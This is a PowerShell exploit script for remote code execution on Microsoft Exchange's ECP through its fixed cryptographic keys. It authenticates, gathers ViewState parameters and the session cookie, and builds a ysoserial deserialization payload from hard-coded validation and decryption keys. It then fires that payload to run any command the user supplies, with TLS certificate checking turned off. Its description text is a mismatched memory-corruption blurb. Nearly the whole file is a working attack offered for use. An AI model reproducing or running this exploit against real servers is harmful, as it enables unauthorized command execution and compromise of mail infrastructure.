<#
.SYNOPSIS
    Remote Code Execution on Microsoft Exchange Server through fixed cryptographic keys
.DESCRIPTION
    A remote code execution vulnerability exists in Microsoft Exchange software when the software fails to properly handle objects in memory, aka 'Microsoft Exchange Memory Corruption Vulnerability'.

.PARAMETER Url
    ECP Server URL.
    Example: http://ip:port

.PARAMETER Username
    Login account.
    Example: domain\user

.PARAMETER Password
    Password

.PARAMETER Command
    Command you want to execute.
    Example: powershell whoami > C:\whoami.txt

.PARAMETER EncryptPayload
    Encrypt the payload? 
    Example: -EncryptPayload

.PARAMETER YsoserialPath
    Path to ysoserial.exe.

.NOTES
    Author:  Tiziano Marra
    Date:    2020-12-07
    Version: 1.0
#>

[CmdletBinding()]
param (
    [Parameter(
            Mandatory=$true,
            HelpMessage='ECP Server URL Example: http://ip:port'
        )
    ][String]$Url,
    [Parameter(
            Mandatory=$true,
            HelpMessage='Login account Example: domain\user'
        )
    ][String]$Username,
    [Parameter(
            Mandatory=$true,
            HelpMessage='Password'
        )
    ][String]$Password,
    [Parameter(
            Mandatory=$true,
            HelpMessage='Command you want to execute'
        )
    ][String]$Command,
    [Parameter(
            Mandatory=$false,
            HelpMessage='Encrypt the payload'
        )
    ][Switch]$EncryptPayload,
    [Parameter(
            Mandatory=$true,
            HelpMessage='Path to ysoserial.exe'
        )
    ][String]$YsoserialPath
)

Function GetBaseUrl {
    [CmdletBinding()]
    param ( 
        [Parameter(Mandatory=$true)][String]$Url
    )

    $ParsedUrl = [System.Uri]$Url

    if (-Not $ParsedUrl.IsAbsoluteUri) {
        return
    }

    if ($Url -Match '://.+@.+') {
        return $ParsedUrl.Scheme + '://' + $ParsedUrl.UserInfo + '@' + $ParsedUrl.Host + ':' + $ParsedUrl.Port
    }
    else {
        return $ParsedUrl.Scheme + '://' + $ParsedUrl.UserInfo + $ParsedUrl.Host + ':' + $ParsedUrl.Port
    }
}

Function Login {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory=$true)][String]$Url,
        [Parameter(Mandatory=$true)][String]$Username,
        [Parameter(Mandatory=$true)][String]$Password,
        [Parameter(Mandatory=$true)][String]$LoginUrl
    )

    $ParamsPost = @{
        password       = $Password
        isUtf8         = '1'
        passwordText   = ''
        trusted        = '4'
        destination    = $Url
        flags          = '4'
        forcedownlevel = '0'
        username       = $Username
    }
    
    $Headers = @{
        Accept                      = 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
        'Upgrade-Insecure-Requests' = '1'
        'User-Agent'                = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:73.0) Gecko/20100101 Firefox/73.0'
        'Accept-Language'           = 'en-US,en;q=0.5'
        'Accept-Encoding'           = 'gzip, deflate'
        'Content-Type'              = 'application/x-www-form-urlencoded'
        Cookie                      = 'PrivateComputer=true; PBack=0'
    }

    try {
        $Request = Invoke-WebRequest -Uri $LoginUrl -WebSession $script:Session -Method POST -Body $ParamsPost -Headers $Headers -TimeoutSec 30

        return @($Request, $ParamsPost, $Headers)
    }
    catch {
        return $_
    }
}

Function GetViewStateGenerator {
    [CmdletBinding()]
    param ( 
        [Parameter(Mandatory=$true)][String]$BaseUrl,
        [Parameter(Mandatory=$true)][Hashtable]$ParamsPost, 
        [Parameter(Mandatory=$true)][Hashtable]$Headers
    )

    try {
        $TargetUrl = "$BaseUrl/ecp/default.aspx"
        $Response = Invoke-WebRequest -Uri $TargetUrl -WebSession $script:Session -Body $ParamsPost -Headers $Headers -TimeoutSec 15
        
        ($Response.Content -Match 'id="__VIEWSTATEGENERATOR" value="(.+?)"')[1] | Out-Null
        
        return $matches[1]
    }
    catch {
        Write-Host $_
        return
    }
}

Function GetKey {
    [CmdletBinding()]
    param ( 
        [Parameter(Mandatory=$true)][String]$BaseUrl
    )

    try {
        $TargetUrl = "$BaseUrl/ecp/default.aspx"
        
        return $script:Session.Cookies.GetCookies($TargetUrl) | Where-Object -Property 'Name' -eq 'ASP.NET_SessionId' | Select-Object -Property 'Value' -ExpandProperty 'Value'
    }
    catch {
        return
    }
}

function GetPayloadParameters {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory=$true)][String]$Command, 
        [Parameter(Mandatory=$true)][String]$View, 
        [Parameter(Mandatory=$true)][String]$Key,
        [Parameter(Mandatory=$false)][Switch]$EncryptPayload
    )
    
    $PayloadParameters = @(
        '-p', 'ViewState',
        '-g', 'TextFormattingRunProperties',
        '-c', "`"$Command`"",
        '--validationalg="SHA1"',
        '--validationkey="CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF"',
        "--generator=`"$View`"",
        "--viewstateuserkey=`"$Key`"",
        '--islegacy'
    )

    if ($EncryptPayload.IsPresent) {
        $PayloadParameters += '--decryptionalg="3DES"'
        $PayloadParameters += '--decryptionkey="E9D2490BD0075B51D1BA5288514514AF"'
        $PayloadParameters += '--isencrypted'
    }
    else {
        $PayloadParameters += '--isdebug'
    }

    return $PayloadParameters
}

function GetPayload {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory=$true)][String]$YsoserialPath
    )

    $YsoserialOutput = (& "$YsoserialPath" $PayloadParameters 2>$null)

    if ($YsoserialOutput -Is [System.Array]) {
        return [Uri]::EscapeDataString($YsoserialOutput[-1])
    }
    else {
        return [Uri]::EscapeDataString($YsoserialOutput)
    }
}

function Exploit {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory=$true)][String]$Url
    )

    try {
        $Status = Invoke-WebRequest -Uri $Url -WebSession $script:Session -TimeoutSec 15 -ErrorAction SilentlyContinue
        
        return $Status.StatusCode
    }
    catch [System.Net.WebException] {
        return $_.Exception.Response.StatusCode
    }
    catch {
        return $_.Exception
    }
}

if (-Not (Test-Path "$YsoserialPath") -Or -Not (Get-Item "$YsoserialPath").Directory.GetFiles('NDesk.Options.dll').Exists) {
    Write-Host '[!] ysoserial.exe or NDesk.Options.dll does not exists'
    return
}

Write-Host '[*] Start to exploit...'

$BaseUrl = GetBaseUrl -Url $Url

if (-Not $BaseUrl) {
    Write-Host '[!] ERROR: Invalid URL'
    return
}

$LoginUrl = "$BaseUrl/owa/auth.owa"
Write-Host "[+] Login url: $LoginUrl"

$CSharpCode = @"
    using System.Net;
    using System.Security.Cryptography.X509Certificates;
    public class TrustAllCertsPolicy : ICertificatePolicy {
        public bool CheckValidationResult(
            ServicePoint srvPoint, X509Certificate certificate,
            WebRequest request, int certificateProblem) {
            return true;
        }
    }
"@

Add-Type $CSharpCode -Language CSharp
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy

$script:Session = New-Object Microsoft.Powershell.Commands.WebRequestSession

$LoginOutcome = Login -Url $Url -Username $Username -Password $Password -LoginUrl $LoginUrl

if ($LoginOutcome -Is [System.Array]) {
    $Response = $LoginOutcome[0]

    Write-Host '[*] Status code:'$Response.StatusCode

    if (-Not $Response.Headers.ContainsKey('Set-Cookie') -Or -Not ($Session.Cookies.GetCookies($LoginUrl) | Where-Object -Property Name -eq 'cadataKey')) {
        Write-Host '[!] Login incorrect, please try again with a different account...'
        return
    }

    Write-Host '[+] Login successfully!'
}
else {
    Write-Host "[!] Login error, error: $LoginOutcome"
    return
}

$ParamsPost = $LoginOutcome[1]
$Headers    = $LoginOutcome[2]

Write-Host '[*] Tring to get __VIEWSTATEGENERATOR...'

$View = GetViewStateGenerator -BaseUrl $BaseUrl -ParamsPost $ParamsPost -Headers $Headers

if ($View) {
    Write-Host "[+] Done! __VIEWSTATEGENERATOR: $View"
}
else {
    $View = 'B97B4E27'
    Write-Host "[*] Can't get __VIEWSTATEGENERATOR, use default value: $View"
}

Write-Host '[*] Tring to get ASP.NET_SessionId...'

$Key = GetKey -BaseUrl $BaseUrl

if (-Not $Key) {
    Write-Host "[!] Get ASP.NET_SessionId error, error: \n$_\n[*] Exit... "
    return
}

Write-Host "[+] Done! ASP.NET_SessionId: $Key"

if ($EncryptPayload.IsPresent) {
    $PayloadParameters = GetPayloadParameters -Command $Command -View $View -Key $Key -EncryptPayload
}
else {
    $PayloadParameters = GetPayloadParameters -Command $Command -View $View -Key $Key
}

Write-Host `n$YsoserialPath ($PayloadParameters -Join ' ')

$Payload = GetPayload -YsoserialPath $YsoserialPath

if ($EncryptPayload.IsPresent) {
    $FinalExp = "$BaseUrl/ecp/default.aspx?__VIEWSTATEENCRYPTED=&__VIEWSTATE=$Payload"
}
else {
    $FinalExp = "$BaseUrl/ecp/default.aspx?__VIEWSTATEGENERATOR=$View&__VIEWSTATE=$Payload"
}

Write-Host "`n[+] Exp url: $FinalExp"
Write-Host "`n[*] Auto trigger payload..."

$Outcome = Exploit -Url $FinalExp

if ($Outcome -eq 'InternalServerError') {
    Write-Host '[+] Status code: 500, Maybe success!'
}
elseif ($Outcome -ne 500) {
    Write-Host "[!] ERROR: Something went wrong"
}
else {
    Write-Host $Outcome
}
